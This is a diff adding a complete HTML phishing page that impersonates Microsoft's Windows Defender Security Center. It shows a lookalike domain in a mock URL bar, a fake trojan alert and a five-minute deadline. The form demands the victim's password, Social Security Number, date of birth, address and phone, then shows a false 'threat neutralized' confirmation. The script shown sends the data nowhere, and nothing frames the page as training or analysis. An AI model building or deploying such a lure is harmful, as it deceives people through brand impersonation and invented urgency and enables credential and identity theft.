@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Alert - Immediate Action Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image:
+                radial-gradient(ellipse at 20% 50%, rgba(0, 120, 212, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 20%, rgba(220, 38, 38, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 80%, rgba(0, 120, 212, 0.05) 0%, transparent 60%);
+        }
+
+        .main-wrapper {
+            width: 100%;
+            max-width: 680px;
+        }
+
+        .fake-browser {
+            background: #2b2b2b;
+            border-radius: 10px 10px 0 0;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .fake-circle {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+
+        .fake-circle.red {
+            background: #ff5f57;
+        }
+        .fake-circle.yellow {
+            background: #febc2e;
+        }
+        .fake-circle.green {
+            background: #28c840;
+        }
+
+        .fake-url-bar {
+            background: #1e1e1e;
+            border-radius: 6px;
+            padding: 7px 12px;
+            flex: 1;
+            font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
+            font-size: 12px;
+            color: #a0a0a0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .fake-url-bar .lock-icon {
+            color: #28c840;
+            font-size: 11px;
+            flex-shrink: 0;
+        }
+        .fake-url-bar .domain {
+            color: #e0e0e0;
+            font-weight: 500;
+        }
+        .fake-url-bar .path {
+            color: #888;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(160deg, #0078d4 0%, #005a9e 40%, #003a6b 100%);
+            color: white;
+            padding: 26px 28px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 160px;
+            height: 160px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .shield-icon {
+            width: 52px;
+            height: 52px;
+            background: white;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .shield-icon svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .header-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        .header-text h1 {
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 3px;
+            letter-spacing: -0.3px;
+        }
+
+        .header-text p {
+            font-size: 12.5px;
+            opacity: 0.85;
+            font-weight: 400;
+        }
+
+        .alert-banner {
+            background: #fef3cd;
+            border-left: 5px solid #f59e0b;
+            padding: 14px 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            border-bottom: 1px solid #fde68a;
+        }
+
+        .alert-banner .alert-icon {
+            font-size: 26px;
+            flex-shrink: 0;
+            line-height: 1;
+        }
+
+        .alert-banner .alert-content h3 {
+            font-size: 14px;
+            color: #92400e;
+            margin-bottom: 2px;
+            font-weight: 700;
+        }
+
+        .alert-banner .alert-content p {
+            font-size: 12px;
+            color: #a16207;
+            line-height: 1.4;
+        }
+
+        .threat-summary {
+            background: #fef2f2;
+            border-bottom: 1px solid #fecaca;
+            padding: 12px 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 12.5px;
+            color: #991b1b;
+            font-weight: 500;
+        }
+
+        .threat-summary .dot {
+            width: 8px;
+            height: 8px;
+            background: #dc2626;
+            border-radius: 50%;
+            animation: pulse-dot 1.2s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6);
+            }
+            50% {
+                box-shadow: 0 0 0 10px rgba(220, 38, 38, 0);
+            }
+        }
+
+        .form-container {
+            padding: 28px 28px 24px;
+        }
+
+        .section-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 18px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #0078d4;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-title .icon {
+            font-size: 18px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12.5px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+            letter-spacing: 0.1px;
+        }
+
+        .form-group label .required {
+            color: #dc2626;
+            margin-left: 2px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 13.5px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: all 0.2s ease;
+            background: #fafbfc;
+            color: #1a1a2e;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+            background: #fff;
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+            font-size: 12.5px;
+        }
+
+        .info-callout {
+            background: #f0f7ff;
+            border: 1px solid #bfdbfe;
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 12px;
+            color: #1e40af;
+            line-height: 1.5;
+        }
+
+        .info-callout .info-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(180deg, #0078d4 0%, #005a9e 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            letter-spacing: 0.2px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 14px rgba(0, 120, 212, 0.35);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #1084e0 0%, #0066b0 100%);
+            box-shadow: 0 6px 20px rgba(0, 120, 212, 0.45);
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 14px 28px;
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            border-top: 1px solid #e5e7eb;
+            line-height: 1.5;
+        }
+
+        .footer .padlock {
+            color: #28c840;
+            font-size: 10px;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 50px 40px;
+            animation: fadeInUp 0.4s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-message .check-icon {
+            width: 72px;
+            height: 72px;
+            background: #22c55e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 36px;
+            color: white;
+            box-shadow: 0 8px 30px rgba(34, 197, 94, 0.35);
+        }
+
+        .success-message h2 {
+            color: #16a34a;
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .success-message p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 4px;
+        }
+
+        .success-message .ref-id {
+            display: inline-block;
+            background: #f0fdf4;
+            color: #15803d;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            margin-top: 10px;
+            border: 1px solid #bbf7d0;
+        }
+
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .form-container {
+                padding: 20px 16px;
+            }
+            .header {
+                padding: 20px 16px;
+                gap: 10px;
+            }
+            .header-text h1 {
+                font-size: 16px;
+            }
+            .shield-icon {
+                width: 40px;
+                height: 40px;
+                border-radius: 8px;
+            }
+            .shield-icon svg {
+                width: 24px;
+                height: 24px;
+            }
+            .fake-url-bar {
+                font-size: 10px;
+                padding: 6px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="fake-browser">
+            <span class="fake-circle red"></span>
+            <span class="fake-circle yellow"></span>
+            <span class="fake-circle green"></span>
+            <div class="fake-url-bar">
+                <span class="lock-icon">🔒</span>
+                <span>https://</span><span class="domain">security-microsoft-verify.com</span><span class="path">/security-alert/verify-identity</span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="header">
+                <div class="shield-icon">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L3 7V12C3 16.55 6.84 20.74 12 22C17.16 20.74 21 16.55 21 12V7L12 2Z" fill="#0078d4" stroke="#005a9e" stroke-width="0.5"/>
+                        <path d="M12 8V13M12 16H12.01" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <div class="header-text">
+                    <h1>Windows Defender Security Center</h1>
+                    <p>Protecting your device from threats</p>
+                </div>
+            </div>
+
+            <div class="alert-banner">
+                <div class="alert-icon">⚠️</div>
+                <div class="alert-content">
+                    <h3>WARNING: Your personal files may be compromised!</h3>
+                    <p>Complete this verification in the next <strong>5 minutes</strong> to lock down your account and prevent irreversible data loss.</p>
+                </div>
+            </div>
+
+            <div class="threat-summary">
+                <span class="dot"></span>
+                <span>Active threat detected: <strong>Trojan:Win32/CredentialAccess!MSR</strong> — classified as severe</span>
+            </div>
+
+            <div id="formSection">
+                <div class="form-container">
+                    <div class="section-title">
+                        <span class="icon">🛡️</span> Identity Verification Required
+                    </div>
+
+                    <div class="info-callout">
+                        <span class="info-icon">ℹ️</span>
+                        <span>A critical security breach has been detected on your device. To prevent data loss and identity theft, you must verify your identity immediately. All submitted information is encrypted and used solely for verification purposes.</span>
+                    </div>
+
+                    <form id="verificationForm" onsubmit="handleSubmit(event)">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="full_name">Full Name <span class="required">*</span></label>
+                                <input type="text" id="full_name" name="full_name" placeholder="John Doe" required autocomplete="name">
+                            </div>
+                            <div class="form-group">
+                                <label for="email">Email Address <span class="required">*</span></label>
+                                <input type="text" id="email" name="email" placeholder="example@email.com" required autocomplete="email">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password">Password <span class="required">*</span></label>
+                            <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="ssn">Social Security Number <span class="required">*</span></label>
+                                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <label for="dob">Date of Birth <span class="required">*</span></label>
+                                <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" required autocomplete="bday">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="address">Home Address <span class="required">*</span></label>
+                                <input type="text" id="address" name="address" placeholder="123 Main St" required autocomplete="street-address">
+                            </div>
+                            <div class="form-group">
+                                <label for="phone">Phone Number <span class="required">*</span></label>
+                                <input type="text" id="phone" name="phone" placeholder="(123) 456-7890" required autocomplete="tel">
+                            </div>
+                        </div>
+
+                        <button type="submit" class="submit-btn">Verify Identity & Secure Account</button>
+                    </form>
+                </div>
+            </div>
+
+            <div id="successSection" class="success-message">
+                <div class="check-icon">✓</div>
+                <h2>Verification Successful</h2>
+                <p>Your identity has been verified and your account is now secured.</p>
+                <p>All threats have been neutralized. You may now close this window.</p>
+                <div class="ref-id">Ref: MS-SEC-VERIFY-8A7F3D2E</div>
+            </div>
+
+            <div class="footer">
+                <span class="padlock">🔒</span> Your connection is encrypted using TLS 1.3 &nbsp;|&nbsp; © 2025 Microsoft Corporation &nbsp;|&nbsp; <span style="color:#0078d4;">Privacy & Cookies</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            var form = document.getElementById('verificationForm');
+            var formData = new FormData(form);
+            var allFilled = true;
+
+            var inputs = form.querySelectorAll('input[required]');
+            inputs.forEach(function(input) {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#dc2626';
+                    input.style.background = '#fef2f2';
+                } else {
+                    input.style.borderColor = '#d1d5db';
+                    input.style.background = '#fafbfc';
+                }
+            });
+
+            if (!allFilled) {
+                var firstEmpty = form.querySelector('input[required]:invalid, input[required][value=""]');
+                if (firstEmpty) {
+                    firstEmpty.focus();
+                    firstEmpty.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                return false;
+            }
+
+            var emailInput = document.getElementById('email');
+            var emailValue = emailInput.value.trim();
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(emailValue)) {
+                emailInput.style.borderColor = '#dc2626';
+                emailInput.style.background = '#fef2f2';
+                emailInput.focus();
+                emailInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            }
+
+            var submitBtn = document.querySelector('.submit-btn');
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.7';
+            submitBtn.style.cursor = 'wait';
+
+            setTimeout(function() {
+                document.getElementById('formSection').style.display = 'none';
+                document.getElementById('successSection').style.display = 'block';
+                document.querySelector('.alert-banner').style.display = 'none';
+                document.querySelector('.threat-summary').style.display = 'none';
+
+                document.querySelector('.threat-summary').insertAdjacentHTML('afterend',
+                    '<div style="background:#f0fdf4;border-bottom:1px solid #bbf7d0;padding:12px 28px;display:flex;align-items:center;gap:10px;font-size:12.5px;color:#15803d;font-weight:500;" id="resolvedBanner">' +
+                    '<span style="font-size:18px;">✅</span> Threat neutralized — device secured</div>'
+                );
+
+                document.getElementById('successSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 1800);
+        }
+    </script>
+</body>
+</html>
